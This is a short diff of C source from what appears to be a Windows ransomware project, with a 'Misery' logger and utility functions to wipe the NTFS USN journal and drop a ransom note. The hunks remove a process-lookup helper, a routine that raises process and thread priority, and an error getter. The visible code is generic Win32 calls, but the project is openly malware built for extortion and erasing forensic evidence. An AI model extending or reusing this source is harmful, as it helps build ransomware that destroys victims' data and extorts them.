@@ -48,33 +48,6 @@ bool UtilsWipeUSNJournal(void) {
     }
 }
 
-DWORD UtilsFindProcessByName(const char* procName) {
-    if (!procName) return 0;
-
-    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnap == INVALID_HANDLE_VALUE) return 0;
-
-    PROCESSENTRY32 pe = { sizeof(pe) };
-    DWORD pid = 0;
-
-    if (Process32First(hSnap, &pe)) {
-        do {
-            if (_stricmp(pe.szExeFile, procName) == 0) {
-                pid = pe.th32ProcessID;
-                break;
-            }
-        } while (Process32Next(hSnap, &pe));
-    }
-
-    CloseHandle(hSnap);
-    return pid;
-}
-
-void UtilsSetHighIOPriority(void) {
-    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
-    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
-    MiseryLog(MISERY_LOG_INFO, "UtilsSetHighIOPriority: I/O priority optimized");
-}
 
 bool UtilsDropRansomNote(const char *filePath, const char *noteContent) {
     if (!filePath || !noteContent) return false;
@@ -98,8 +71,4 @@ bool UtilsDropRansomNote(const char *filePath, const char *noteContent) {
         CloseHandle(hFile);
         return false;
     }
-}
-
-int UtilsGetLastError(void) {
-    return g_utils_last_error;
 }
